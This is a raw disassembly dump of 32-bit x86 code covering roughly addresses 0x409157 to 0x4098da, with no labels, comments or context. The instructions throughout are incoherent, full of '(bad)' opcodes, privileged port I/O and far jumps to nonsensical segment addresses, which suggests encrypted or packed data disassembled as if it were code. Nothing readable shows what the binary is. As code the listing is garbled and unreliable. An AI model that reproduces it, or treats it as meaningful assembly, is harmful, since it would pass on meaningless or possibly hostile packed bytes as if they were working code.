  409157:	add    DWORD PTR [eax-0x20],0x18
  40915b:	pop    ecx
  40915c:	pop    ebx
  40915d:	outs   dx,DWORD PTR ds:[esi]
  40915e:	jmp    DWORD PTR [edx-0x4]
  409161:	inc    esi
  409162:	mov    cl,0x9
  409164:	sub    DWORD PTR [eax],ebx
  409166:	cld    
  409167:	inc    esp
  409168:	into   
  409169:	jb     0x409182
  40916b:	add    eax,0x2f17b2ca
  409170:	xor    eax,0x7ffd5064
  409175:	ins    BYTE PTR es:[edi],dx
  409176:	pop    edi
  409177:	retf   0x854d
  40917a:	inc    edi
  40917b:	(bad)  
  40917c:	cmp    BYTE PTR [ecx-0x5617fdbd],dl
  409182:	dec    edi
  409183:	adc    eax,0xe6709159
  409188:	lds    esi,FWORD PTR [eax+0x5e]
  40918b:	push   esi
  40918c:	xchg   ebx,eax
  40918d:	push   0x36ee8a41
  409192:	dec    edi
  409193:	xor    ah,BYTE PTR [ecx+0x20]
  409196:	loopne 0x40913c
  409198:	sub    al,0xef
  40919a:	push   eax
  40919b:	xchg   edx,eax
  40919c:	mov    ch,0x3a
  40919e:	adc    BYTE PTR [ebx],bh
  4091a0:	dec    esi
  4091a1:	in     al,dx
  4091a2:	fld    QWORD PTR [edx-0x21]
  4091a5:	jbe    0x409185
  4091a7:	pop    edi
  4091a8:	pop    ecx
  4091a9:	(bad)  
  4091aa:	cmovle ecx,edi
  4091ad:	adc    edx,DWORD PTR [edi+0x6c]
  4091b0:	cwde   
  4091b1:	sbb    eax,ecx
  4091b3:	or     dh,cl
  4091b5:	sbb    al,0x1a
  4091b7:	pushf  
  4091b8:	pop    ss
  4091b9:	stos   DWORD PTR es:[edi],eax
  4091ba:	inc    ebx
  4091bb:	jno    0x409214
  4091bd:	pop    edx
  4091be:	xor    edi,DWORD PTR [edi+edi*4-0x748f1040]
  4091c5:	test   BYTE PTR [edi+0x5b],0x20
  4091c9:	(bad)  [esi+0x69]
  4091cc:	xchg   edx,eax
  4091cd:	mov    DWORD PTR [esi+ebp*2],ebx
  4091d0:	sub    DWORD PTR [eax-0x50af8b6],ecx
  4091d6:	rol    DWORD PTR es:[ecx+0x46],0xbf
  4091db:	icebp  
  4091dc:	mov    ch,0xa0
  4091de:	add    eax,0x305f8d3f
  4091e3:	fsubp  st(7),st
  4091e5:	in     al,0x1a
  4091e7:	xor    eax,DWORD PTR [edi-0x1b41de3]
  4091ed:	pop    esp
  4091ee:	cs (bad) 
  4091f0:	addr16 jne 0x409230
  4091f3:	int3   
  4091f4:	or     al,0x93
  4091f6:	fst    st(3)
  4091f8:	arpl   WORD PTR [edx],bx
  4091fa:	clc    
  4091fb:	retf   
  4091fc:	int    0xb2
  4091fe:	or     eax,0x6f88bf02
  409203:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409204:	or     al,bl
  409206:	ret    
  409207:	add    DWORD PTR [esi+0x72],eax
  40920a:	jg     0x4091f4
  40920c:	retf   0x4b69
  40920f:	std    
  409210:	and    DWORD PTR [edi+0x57],ebx
  409213:	fwait
  409214:	xchg   dh,ch
  409216:	sbb    edx,DWORD PTR [eax-0x15]
  409219:	sysret 
  40921b:	sar    BYTE PTR [ebx+0x5ccae759],1
  409221:	into   
  409222:	push   ebx
  409223:	mov    bl,0x14
  409225:	loopne 0x409242
  409227:	aaa    
  409228:	bound  eax,QWORD PTR ds:[esi-0x79e06596]
  40922f:	nop
  409230:	jl     0x4091c5
  409232:	out    dx,eax
  409233:	jae    0x4091f0
  409235:	bound  eax,QWORD PTR [eax]
  409237:	nop
  409238:	pop    edx
  409239:	add    DWORD PTR [esi-0x34cb7b93],esi
  40923f:	stc    
  409240:	adc    ah,ch
  409242:	rol    DWORD PTR [eax+0x6d],1
  409245:	push   ebp
  409246:	out    0xd4,eax
  409248:	mov    es,WORD PTR [edx-0x6da444c4]
  40924e:	and    DWORD PTR [esi+0x33],0xdf092d9b
  409255:	mov    al,0x99
  409257:	nop
  409258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409259:	stos   DWORD PTR es:[edi],eax
  40925a:	test   BYTE PTR [esi+ebx*4+0x74ec18f3],0x77
  409262:	cmp    DWORD PTR [esi],ecx
  409264:	and    dl,BYTE PTR [eax+0xa]
  409267:	pop    es
  409268:	mov    al,BYTE PTR [ecx-0x80]
  40926b:	mov    ebp,0x8b757f11
  409270:	xlat   BYTE PTR ds:[ebx]
  409271:	push   0x1a
  409273:	syscall 
  409275:	in     al,dx
  409276:	addr16 jns 0x40922e
  409279:	jmp    0x5aded366
  40927e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40927f:	fimul  DWORD PTR [edi+0x5e]
  409282:	in     eax,0xc8
  409284:	out    dx,eax
  409285:	xor    ebx,DWORD PTR [eax]
  409287:	dec    esp
  409288:	add    DWORD PTR [esi+0x289dffd4],esi
  40928e:	das    
  40928f:	dec    esi
  409290:	lods   al,BYTE PTR ds:[esi]
  409292:	out    dx,al
  409293:	into   
  409294:	mov    BYTE PTR [ecx],dl
  409296:	pushf  
  409297:	clc    
  409298:	dec    esp
  409299:	shl    WORD PTR [ebx-0x1d],1
  40929d:	stos   BYTE PTR es:[edi],al
  40929e:	lods   eax,DWORD PTR ds:[esi]
  40929f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092a0:	lahf   
  4092a1:	fwait
  4092a2:	mov    ebx,0xa20e24c8
  4092a7:	add    eax,eax
  4092a9:	loopne 0x40925e
  4092ab:	gs fcomip st,st(0)
  4092ae:	adc    DWORD PTR [ecx-0x79342729],edx
  4092b4:	xlat   BYTE PTR ds:[ebx]
  4092b5:	retf   
  4092b6:	and    DWORD PTR [edi+0x4e],ebx
  4092b9:	xchg   ebp,eax
  4092ba:	pop    ss
  4092bb:	mov    ds:0x8feb049d,al
  4092c0:	ins    BYTE PTR es:[edi],dx
  4092c1:	cli    
  4092c2:	or     edi,edx
  4092c4:	iret   
  4092c5:	and    al,dh
  4092c7:	retf   0xe948
  4092ca:	mov    ds:0x8d547619,eax
  4092cf:	retf   0x35c3
  4092d2:	dec    ecx
  4092d3:	mov    cl,0x50
  4092d5:	xchg   esi,eax
  4092d6:	cdq    
  4092d7:	fs push 0xffffffa7
  4092da:	add    ah,BYTE PTR [edx]
  4092dc:	xor    eax,0x7da8f914
  4092e1:	ins    BYTE PTR es:[edi],dx
  4092e2:	repnz sub BYTE PTR ds:0x9d1cb0a9,cl
  4092e9:	(bad)  
  4092ea:	outs   dx,BYTE PTR ds:[esi]
  4092eb:	or     eax,0xd6d8a562
  4092f0:	push   ebx
  4092f1:	call   0xf064:0xd7d22c65
  4092f8:	pop    eax
  4092f9:	(bad)
  4092fd:	leave  
  4092fe:	and    ebp,DWORD PTR [ebx+0x789c0dde]
  409304:	fnstsw WORD PTR [ecx+0x2e575f3a]
  40930a:	xchg   DWORD PTR [ebx+eax*4],eax
  40930d:	xor    DWORD PTR [ebx+ecx*1],esp
  409310:	loope  0x4092df
  409312:	adc    DWORD PTR [ecx],0x5a
  409315:	cmp    ebx,esi
  409317:	or     ecx,ecx
  409319:	ds imul edi,edi,0xf7b21e6c
  409320:	xor    esi,DWORD PTR [ecx+0x1999aba0]
  409326:	sbb    al,0xd5
  409328:	sub    BYTE PTR [edx-0x2a],0x8c
  40932c:	push   ss
  40932d:	xor    esi,ebx
  40932f:	fdiv   st(6),st
  409331:	or     eax,0x8edc95b4
  409336:	mov    esp,0x5c89dcdd
  40933b:	outs   dx,BYTE PTR ds:[esi]
  40933c:	xlat   BYTE PTR ds:[ebx]
  40933e:	or     ch,BYTE PTR [ebx-0x46]
  409341:	cmp    BYTE PTR [edx-0x8],dl
  409344:	push   ebx
  409345:	xchg   ecx,eax
  409346:	add    al,0x7e
  409348:	mov    ds:0xfdb24119,al
  40934d:	dec    ebp
  40934e:	fwait
  40934f:	xlat   BYTE PTR ds:[ebx]
  409350:	xchg   esi,eax
  409351:	outs   dx,DWORD PTR ds:[esi]
  409352:	and    DWORD PTR [esi+0x7e9de54d],ebp
  409358:	ja     0x4092fa
  40935a:	jae    0x4092f5
  40935c:	xchg   BYTE PTR [ebp+0x4a3a9b42],cl
  409362:	bound  esp,QWORD PTR [ebx+0x17]
  409365:	xchg   esi,eax
  409366:	test   DWORD PTR [ebp+ecx*4-0x71],esi
  40936a:	push   ebp
  40936b:	xlat   BYTE PTR ds:[ebx]
  40936c:	sub    ah,0x62
  40936f:	int    0xde
  409371:	scas   al,BYTE PTR es:[edi]
  409372:	fcmovnu st,st(4)
  409374:	lahf   
  409375:	mov    DWORD PTR [ebx+0x55],edi
  409378:	mov    bl,0x6f
  40937a:	jmp    0x78c1:0x36f5c68f
  409381:	mov    ebx,0xd3909c72
  409386:	mov    cl,BYTE PTR [ebp-0x14]
  409389:	mov    ecx,0xe358e5f3
  40938e:	sbb    al,BYTE PTR [edx+0x45]
  409391:	out    0x95,eax
  409393:	fs scas al,BYTE PTR es:[edi]
  409395:	mov    ds:0x8ab43e1a,eax
  40939a:	ins    BYTE PTR es:[edi],dx
  40939b:	push   ebx
  40939c:	xor    eax,0x7287d28c
  4093a1:	push   esi
  4093a2:	jmp    0x4627:0xdee0ce07
  4093a9:	push   ds
  4093aa:	add    edx,DWORD PTR [edi]
  4093ac:	repnz mov ecx,DWORD PTR [esi]
  4093af:	lea    ecx,[ebp-0x44]
  4093b2:	mov    bl,0xf1
  4093b4:	add    ebx,DWORD PTR [esi-0x43]
  4093b7:	and    edx,DWORD PTR [ebx]
  4093b9:	xor    DWORD PTR [edi+0x37],eax
  4093bc:	fdiv   DWORD PTR [eax+0xd]
  4093bf:	stos   DWORD PTR es:[edi],eax
  4093c0:	out    0x37,al
  4093c2:	fdivr  QWORD PTR [edx+eiz*1-0x14]
  4093c6:	or     DWORD PTR [edi+0x6a1fec32],edi
  4093cc:	mov    ch,0x68
  4093ce:	mov    BYTE PTR [edi+0x0],cl
  4093d1:	(bad)  
  4093d2:	mov    esi,0x7ca14ad3
  4093d7:	push   ds
  4093d8:	push   ecx
  4093d9:	div    BYTE PTR [ebx+esi*4-0x2e894036]
  4093e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093e1:	adc    cl,al
  4093e3:	dec    eax
  4093e4:	add    eax,ebp
  4093e6:	aaa    
  4093e7:	push   edx
  4093e8:	clc    
  4093e9:	inc    BYTE PTR [eax-0x58]
  4093ec:	icebp  
  4093ed:	xchg   ecx,eax
  4093ee:	lds    edi,FWORD PTR [edx]
  4093f0:	mov    eax,ds:0x4209d3c8
  4093f5:	sbb    esp,eax
  4093f7:	call   0x821ac16e
  4093fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093fd:	icebp  
  4093fe:	mov    ch,0xd3
  409400:	pop    ebp
  409401:	jg     0x40938f
  409403:	out    0x23,eax
  409405:	stc    
  409406:	retf   
  409407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409408:	test   al,0x40
  40940a:	adc    ebp,DWORD PTR [esi+esi*2]
  40940d:	in     al,dx
  40940e:	bound  ebx,QWORD PTR [eax+edx*2+0x7a]
  409412:	dec    esi
  409413:	mov    dh,0x80
  409415:	push   es
  409416:	ins    BYTE PTR es:[edi],dx
  409417:	xchg   ebx,eax
  409418:	stc    
  409419:	sbb    edx,edi
  40941b:	pop    esp
  40941c:	iret   
  40941d:	add    DWORD PTR [ecx+0x367e6edd],eax
  409423:	push   edi
  409424:	pop    es
  409425:	sub    dl,BYTE PTR [ebp-0x6692fe3e]
  40942b:	test   al,0xdc
  40942d:	mov    ss,WORD PTR [ebp+0x66]
  409430:	inc    ecx
  409431:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409432:	cdq    
  409433:	xor    DWORD PTR [ebx+0x2c],ebp
  409436:	jmp    0x409409
  409438:	inc    esp
  409439:	gs ret 
  40943b:	lds    ebp,FWORD PTR [esi]
  40943d:	cdq    
  40943e:	leave  
  40943f:	and    edx,DWORD PTR [edi]
  409441:	ja     0x40945a
  409443:	and    edi,ecx
  409445:	popa   
  409446:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409447:	dec    esi
  409448:	or     DWORD PTR [esi],esp
  40944a:	adc    bl,dl
  40944c:	push   ss
  40944d:	adc    edi,ebp
  40944f:	jecxz  0x4093db
  409451:	dec    ecx
  409452:	jp     0x409488
  409454:	ins    DWORD PTR es:[edi],dx
  409455:	mov    bh,0xf8
  409457:	mov    ah,0x4c
  409459:	jl     0x4094b2
  40945b:	cdq    
  40945c:	repnz int 0xc0
  40945f:	dec    ebp
  409460:	bsf    eax,DWORD PTR [edi]
  409463:	push   esp
  409464:	add    ebp,ecx
  409466:	mov    ecx,0xc24dabcc
  40946b:	dec    esp
  40946c:	scas   eax,DWORD PTR es:[edi]
  40946d:	lods   al,BYTE PTR ds:[esi]
  40946e:	mov    ds:0xd582353b,eax
  409474:	gs sbb eax,0xce6cb7d7
  40947a:	and    eax,0x4ba224fa
  40947f:	sbb    ecx,edx
  409481:	retf   
  409482:	sub    al,0xf1
  409484:	sbb    ch,bl
  409486:	xchg   ebp,eax
  409487:	or     DWORD PTR [ebx-0x2808fc55],0xf
  40948e:	sbb    BYTE PTR [ecx],0x85
  409491:	jns    0x4094f5
  409493:	sbb    DWORD PTR [ebx+0x4a],esp
  409496:	sahf   
  409497:	dec    ecx
  409498:	out    0x83,al
  40949a:	xchg   ebx,eax
  40949b:	jnp    0x409432
  40949d:	mov    dh,0xde
  40949f:	outs   dx,DWORD PTR ds:[esi]
  4094a0:	les    ecx,FWORD PTR [ebp+0x32]
  4094a3:	fdivr  st,st(3)
  4094a5:	js     0x40944b
  4094a7:	xor    ecx,esp
  4094a9:	sbb    DWORD PTR [edi],ecx
  4094ab:	cmp    edi,eax
  4094ad:	shl    BYTE PTR [ecx+0x79],0x44
  4094b1:	add    eax,0xccd6d808
  4094b6:	cmp    al,0x87
  4094b8:	jb     0x409447
  4094ba:	in     eax,dx
  4094bb:	push   edi
  4094bc:	mov    dl,0x49
  4094be:	jmp    0xf9dc:0x4808a39a
  4094c5:	push   eax
  4094c6:	test   eax,0x62c2d53
  4094cb:	dec    esi
  4094cc:	sbb    DWORD PTR [eax+eiz*4],eax
  4094cf:	cdq    
  4094d0:	adc    DWORD PTR ds:0x9323d4ad,esp
  4094d6:	dec    edi
  4094d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094d8:	aad    0xa3
  4094da:	(bad)  
  4094db:	adc    esi,ebp
  4094dd:	pushf  
  4094de:	mov    ?,eax
  4094e0:	sub    esi,ecx
  4094e2:	in     al,0x5
  4094e4:	or     BYTE PTR [esi],al
  4094e6:	and    BYTE PTR [edi-0x65],ah
  4094e9:	sub    bh,BYTE PTR [esi-0x59]
  4094ec:	pop    es
  4094ed:	push   edi
  4094ee:	not    DWORD PTR [ebp-0x4d]
  4094f1:	nop
  4094f2:	jg     0x4094c4
  4094f4:	lahf   
  4094f5:	(bad)  
  4094f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094f8:	(bad)  
  4094f9:	enter  0xa7bb,0x94
  4094fd:	mov    dl,0x95
  4094ff:	lahf   
  409500:	fdiv   st,st(5)
  409502:	fidivr DWORD PTR [ecx-0x3eba785b]
  409508:	push   ds
  409509:	jecxz  0x4094f2
  40950b:	in     eax,dx
  40950c:	jae    0x4094d2
  40950e:	sbb    bl,BYTE PTR [eax-0x1f554926]
  409514:	fxch   st(0)
  409516:	and    DWORD PTR [eax+0x14],0xfffffff0
  40951a:	(bad)  
  40951b:	xor    al,0x33
  40951d:	mov    esp,DWORD PTR [ecx+0x3e]
  409520:	cmp    eax,0x64e46eb2
  409525:	pop    eax
  409526:	je     0x4094b6
  409528:	lea    eax,[ecx-0x5d]
  40952b:	add    al,0x6b
  40952d:	mov    ebx,0xb69be1f6
  409532:	pop    ebp
  409533:	stos   BYTE PTR es:[edi],al
  409534:	jle    0x409509
  409536:	xchg   ebp,eax
  409537:	in     eax,0x5d
  409539:	pop    ss
  40953a:	pop    eax
  40953b:	sbb    ah,BYTE PTR [edi]
  40953d:	or     bh,dh
  40953f:	push   esi
  409540:	pop    ecx
  409541:	or     DWORD PTR [edx-0x29640a32],ecx
  409547:	xor    DWORD PTR [edx+0x2f],0x1a9db616
  40954e:	sub    al,0x2b
  409550:	jne    0x409585
  409552:	adc    BYTE PTR [ebp+0x7cfdb164],dl
  409558:	cld    
  409559:	mov    WORD PTR [edi+0x10],gs
  40955c:	inc    ecx
  40955d:	dec    edx
  40955e:	xchg   edx,eax
  40955f:	xor    al,0x7a
  409561:	rol    BYTE PTR [ecx-0x4d],cl
  409564:	mov    cl,0xa5
  409566:	test   al,0xa9
  409568:	hlt    
  409569:	test   eax,0x3a7a7678
  40956e:	push   ebp
  40956f:	inc    BYTE PTR [esp+esi*1+0x54534960]
  409576:	pop    edi
  409577:	lds    ebp,FWORD PTR [ecx+0x12]
  40957a:	add    ebp,eax
  40957c:	je     0x4095f4
  40957e:	xchg   esi,eax
  40957f:	adc    eax,0xe7bec3d6
  409584:	xchg   ebp,eax
  409585:	mov    ds:0xd1da550,eax
  40958a:	push   ss
  40958b:	mov    cl,bh
  40958d:	mov    al,ds:0x40234270
  409592:	stc    
  409593:	mov    esp,0x37b290e9
  409598:	aad    0xb7
  40959a:	jne    0x4095e1
  40959c:	inc    edi
  40959d:	cwde   
  40959e:	jnp    0x40956e
  4095a0:	inc    ebp
  4095a1:	dec    ebp
  4095a3:	push   ebx
  4095a4:	repz pop edx
  4095a6:	mov    esp,es
  4095a8:	test   al,0xbb
  4095aa:	push   edx
  4095ab:	enter  0xe2b1,0xe2
  4095af:	push   esp
  4095b0:	in     al,0xf8
  4095b2:	adc    ah,BYTE PTR [ebp+ecx*1+0x721d0b55]
  4095b9:	mov    eax,0xac5887f0
  4095be:	or     dh,BYTE PTR [edx-0x18a7c4fe]
  4095c4:	inc    ecx
  4095c5:	pop    edi
  4095c6:	mov    cl,0x3a
  4095c8:	xchg   edx,eax
  4095c9:	stos   DWORD PTR es:[edi],eax
  4095ca:	ss mov ds,edx
  4095cd:	and    BYTE PTR [esi+0x6c9ca16d],dl
  4095d3:	enter  0xe276,0x4f
  4095d7:	clc    
  4095d8:	add    DWORD PTR [esi+0x3eda13b1],eax
  4095de:	hlt    
  4095df:	inc    ebp
  4095e0:	leave  
  4095e1:	pop    DWORD PTR [edi+0x3a4c6106]
  4095e7:	cmp    al,BYTE PTR [ebx-0x1e]
  4095ea:	sbb    DWORD PTR [ebp-0x51],edi
  4095ed:	enter  0x904f,0xfc
  4095f1:	jo     0x409653
  4095f3:	mov    cl,0x98
  4095f5:	loop   0x4095b8
  4095f7:	cld    
  4095f8:	lock pop ebp
  4095fa:	mov    eax,0x9ca1c24
  4095ff:	or     eax,0x62f6212c
  409604:	jmp    0x99835f98
  409609:	icebp  
  40960a:	jmp    0xda34:0x3f6e794d
  409611:	xchg   esp,eax
  409612:	cwde   
  409613:	mov    eax,0xd074d505
  409618:	push   ebx
  409619:	add    bl,BYTE PTR [esi-0x57]
  40961c:	cmp    BYTE PTR [ebx-0x33],al
  40961f:	mov    WORD PTR [ebp-0x4e],?
  409622:	pop    edx
  409623:	pop    esi
  409624:	cmp    ecx,DWORD PTR ds:0x7ece7b37
  40962a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40962b:	jmp    0x4096a1
  40962d:	aas    
  40962e:	mov    BYTE PTR [eax],dl
  409630:	popa   
  409631:	fmulp  st(4),st
  409633:	ss es jg 0x409645
  409637:	push   edi
  409638:	jbe    0x409655
  40963a:	and    esp,DWORD PTR [ebx+0x4571f4f7]
  409640:	jmp    0x2a2d:0xfab6f33e
  409647:	call   0x926b020a
  40964c:	sub    edi,ebx
  40964e:	lock xchg edx,eax
  409650:	cmp    al,0x16
  409652:	push   ebx
  409653:	mov    ds:0xa094d971,eax
  409658:	fadd   DWORD PTR ds:[esp+eax*2]
  40965c:	cs nop
  40965e:	mov    ch,0xf0
  409660:	jnp    0x409674
  409662:	inc    ebp
  409663:	dec    ecx
  409664:	fisttp QWORD PTR ds:0x68be69e5
  40966a:	mov    WORD PTR [ecx],cs
  40966c:	(bad)  
  40966d:	push   cs
  40966e:	lods   eax,DWORD PTR ds:[esi]
  40966f:	ja     0x409694
  409671:	pop    ebp
  409672:	adc    BYTE PTR [ecx],cl
  409674:	sbb    ah,cl
  409676:	scas   al,BYTE PTR es:[edi]
  409677:	inc    edi
  409678:	lds    edx,FWORD PTR [ecx-0xc]
  40967b:	retf   
  40967c:	popf   
  40967d:	xchg   ebx,eax
  40967e:	or     eax,0xd7b79cac
  409683:	sbb    esp,DWORD PTR [ecx-0x2025411e]
  409689:	aaa    
  40968a:	xchg   BYTE PTR [eax+0x693bf468],cl
  409690:	jp     0x4096e5
  409692:	ret    0xc5c7
  409695:	or     bl,cl
  409697:	ret    
  409698:	mov    ch,0xd3
  40969a:	pop    eax
  40969b:	and    ecx,edi
  40969d:	retf   0x415b
  4096a0:	daa    
  4096a1:	add    DWORD PTR [eax+0x2e],esp
  4096a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096a5:	sbb    ebp,DWORD PTR [eax+0x737453a3]
  4096ab:	mov    eax,ds:0x472bb5a
  4096b0:	shl    DWORD PTR [edx],cl
  4096b2:	fdivr  st(7),st
  4096b4:	mov    eax,ds:0x31fb4a38
  4096b9:	call   0x2942b0db
  4096be:	jmp    0x4096ae
  4096c0:	arpl   si,bx
  4096c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096c3:	sub    eax,0x3e828135
  4096c8:	mov    ?,WORD PTR [esi-0x591c01fc]
  4096ce:	jecxz  0x4096b5
  4096d0:	ins    DWORD PTR es:[edi],dx
  4096d1:	inc    esi
  4096d2:	int    0xe6
  4096d4:	jo     0x409731
  4096d6:	jmp    0xfc9cb05c
  4096db:	xchg   ebp,eax
  4096dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096dd:	je     0x409667
  4096df:	scas   eax,DWORD PTR es:[edi]
  4096e0:	div    BYTE PTR [ebx+0x4bdd3c44]
  4096e6:	mov    edx,0x3caf7410
  4096eb:	push   ebp
  4096ec:	xor    eax,0x97a28bb9
  4096f1:	idiv   BYTE PTR [edx]
  4096f3:	sbb    ah,BYTE PTR [ecx+0x73]
  4096f6:	(bad)  
  4096f7:	sbb    edi,esi
  4096f9:	sub    edi,eax
  4096fb:	pop    ecx
  4096fc:	adc    al,0x6d
  4096fe:	push   ecx
  4096ff:	test   eax,0x56828934
  409704:	cdq    
  409705:	cwde   
  409706:	mov    ecx,0xd570fb4a
  40970b:	cmp    eax,0x8577e000
  409710:	cs pop es
  409712:	imul   esi,ebp,0x41c8e50c
  409718:	mov    bl,0x2e
  40971a:	cs sub bh,ah
  40971d:	pusha  
  40971e:	pop    edi
  40971f:	jg     0x409759
  409721:	jp     0x4096c6
  409723:	mov    cl,0x7b
  409725:	inc    esi
  409726:	jo     0x4096f0
  409728:	sbb    dl,BYTE PTR [esi-0x7f0f52d5]
  40972e:	sar    ah,cl
  409730:	push   ecx
  409731:	cmp    BYTE PTR ds:0x2332d871,bl
  409737:	sub    al,BYTE PTR [ecx+esi*1]
  40973a:	inc    ebp
  40973b:	sahf   
  40973c:	pusha  
  40973d:	mov    cs,WORD PTR [ecx-0x1c7978be]
  409743:	aad    0x15
  409745:	mov    ebx,0x994ba145
  40974a:	outs   dx,DWORD PTR ds:[esi]
  40974b:	lods   eax,DWORD PTR ds:[esi]
  40974c:	mov    eax,ds:0x9e3fc68e
  409751:	xchg   BYTE PTR [eax-0x6204b59d],ah
  409757:	shl    bl,0xa4
  40975a:	out    dx,eax
  40975b:	sub    al,bl
  40975d:	sub    BYTE PTR [eax-0x63],cl
  409760:	mov    ebp,DWORD PTR [esi+edi*1]
  409763:	inc    ebx
  409764:	inc    esp
  409765:	rcr    DWORD PTR [edx+0x64e573ab],cl
  40976b:	and    ah,BYTE PTR [ebp+0x79263dee]
  409771:	ins    BYTE PTR es:[edi],dx
  409772:	adc    esp,DWORD PTR [ebp-0x66]
  409775:	scas   eax,DWORD PTR es:[edi]
  409776:	aad    0x49
  409778:	or     al,0x4e
  40977a:	xlat   BYTE PTR ds:[ebx]
  40977b:	sbb    ah,ah
  40977d:	push   cs
  40977e:	add    ch,BYTE PTR [edx-0x67]
  409781:	dec    eax
  409782:	mov    ah,0xc5
  409784:	(bad)  
  409786:	in     al,0xf8
  409788:	cmp    cl,0x9b
  40978b:	rcr    BYTE PTR [edi],0xc3
  40978e:	cdq    
  40978f:	pop    ebp
  409790:	dec    eax
  409791:	daa    
  409792:	dec    edx
  409793:	jl     0x409784
  409795:	ds or  esp,edi
  409798:	mov    eax,ds:0xd614a988
  40979d:	inc    esi
  40979e:	push   ebx
  40979f:	dec    edx
  4097a0:	inc    ebx
  4097a1:	mov    WORD PTR [edx-0x32977a94],es
  4097a7:	jo     0x4097ac
  4097a9:	shl    BYTE PTR [edx],0xc8
  4097ac:	hlt    
  4097ad:	cmp    esp,DWORD PTR [ebx-0x62]
  4097b0:	idiv   DWORD PTR [ebp+0x14]
  4097b3:	gs retf 
  4097b5:	lahf   
  4097b6:	push   0x9868a189
  4097bb:	cmp    ecx,DWORD PTR [esi]
  4097bd:	hlt    
  4097be:	or     BYTE PTR [ebx],cl
  4097c0:	and    cl,BYTE PTR [ecx+0x12]
  4097c3:	dec    edi
  4097c4:	test   DWORD PTR [eax-0x3e],0xbb29f681
  4097cb:	mov    dl,0x57
  4097cd:	jge    0x40975f
  4097cf:	aas    
  4097d0:	inc    edi
  4097d1:	mov    eax,0x9c7dfe3d
  4097d6:	mov    WORD PTR [ebp-0x1d],cs
  4097d9:	inc    ecx
  4097da:	add    edi,DWORD PTR cs:[ebp+0x64]
  4097de:	mov    esi,0x20c8c843
  4097e3:	dec    edx
  4097e4:	fcom   DWORD PTR [ebx+0xf]
  4097e7:	outs   dx,DWORD PTR ds:[esi]
  4097e8:	leave  
  4097e9:	call   0x1c264a7c
  4097ee:	jmp    0x6232:0x559a6d52
  4097f5:	outs   dx,DWORD PTR ds:[esi]
  4097f6:	or     ebx,ebp
  4097f8:	mov    fs,WORD PTR [ebp+esi*8-0x70]
  4097fc:	xor    al,0xc7
  4097fe:	dec    esp
  4097ff:	mov    ah,BYTE PTR [ecx+0x3c]
  409802:	ins    BYTE PTR es:[edi],dx
  409803:	std    
  409804:	adc    edi,DWORD PTR [edi-0x7f]
  409807:	outs   dx,DWORD PTR ds:[esi]
  409808:	mov    fs,WORD PTR [edx]
  40980a:	add    DWORD PTR [edx+ecx*1-0x32],edx
  40980e:	lds    edi,FWORD PTR [ecx]
  409810:	mov    ds:0xa5372ecf,al
  409815:	call   0x76dfda93
  40981a:	aad    0x76
  40981c:	push   es
  40981d:	pop    ebp
  40981e:	pop    esp
  40981f:	mul    BYTE PTR [ebp+esi*4+0x76757eb2]
  409826:	push   ebx
  409827:	add    ah,ch
  409829:	mov    bl,0x9c
  40982b:	pop    esp
  40982c:	xchg   esi,eax
  40982d:	popf   
  40982e:	push   ebp
  40982f:	sub    BYTE PTR [edx+0x708c3996],cl
  409835:	xor    ecx,edi
  409837:	out    0xa5,al
  409839:	pop    ecx
  40983a:	mov    dl,0x5e
  40983c:	sub    eax,eax
  40983e:	fwait
  40983f:	es inc ecx
  409841:	loop   0x409810
  409843:	lods   eax,DWORD PTR ds:[esi]
  409844:	fucomip st,st(5)
  409846:	push   edx
  409847:	idiv   BYTE PTR [eax+0x54575c27]
  40984d:	retf   
  40984e:	outs   dx,DWORD PTR ds:[esi]
  40984f:	or     bh,BYTE PTR [eax-0x7]
  409852:	mov    ch,BYTE PTR [esi+0x3de0653d]
  409858:	cmp    dh,cl
  40985a:	sbb    edx,DWORD PTR [ebx+0x50c74fcf]
  409860:	sub    BYTE PTR [eax-0x57],0x13
  409864:	xor    al,0xb4
  409866:	popa   
  409867:	mov    BYTE PTR [edi],ch
  409869:	push   es
  40986a:	in     eax,dx
  40986b:	call   FWORD PTR ds:0x95ed5988
  409871:	test   eax,0x5e1476bd
  409876:	pop    ebp
  409877:	xor    eax,0xff3ccfa3
  40987c:	pop    ss
  40987d:	(bad)  
  40987e:	clc    
  40987f:	loop   0x40982a
  409881:	add    DWORD PTR [ecx-0x37e48ba2],eax
  409887:	ins    DWORD PTR es:[edi],dx
  409888:	mov    ebx,0x8c6943ba
  40988d:	pop    ebp
  40988e:	test   DWORD PTR [edx-0x31ae8865],esp
  409894:	mov    bl,0xbd
  409896:	push   0xffffffa1
  409898:	scas   eax,DWORD PTR es:[edi]
  409899:	sbb    al,0xff
  40989b:	call   0x4d328da1
  4098a0:	push   edx
  4098a1:	inc    ebp
  4098a2:	cmp    al,0xc5
  4098a4:	out    dx,al
  4098a5:	inc    ebx
  4098a6:	pop    edx
  4098a7:	cmc    
  4098a8:	(bad)  
  4098a9:	jmp    0xf1e8:0xea246126
  4098b0:	jecxz  0x409862
  4098b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098b3:	jnp    0x4098f8
  4098b5:	sub    BYTE PTR [eax+0x784d4fdc],0x8e
  4098bc:	or     DWORD PTR [ebx+0x71],eax
  4098bf:	xor    bh,al
  4098c1:	mov    esi,0xeb12bd2b
  4098c6:	inc    DWORD PTR [eax+0x2d]
  4098c9:	xchg   BYTE PTR [ecx],ch
  4098cb:	ret    0x387f
  4098ce:	lods   eax,DWORD PTR ds:[esi]
  4098cf:	push   ds
  4098d0:	sbb    al,0x5d
  4098d2:	test   eax,0x54aa9cd4
  4098d7:	in     al,0xc3
  4098d9:	push   edi
  4098da:	out    0x9b,al
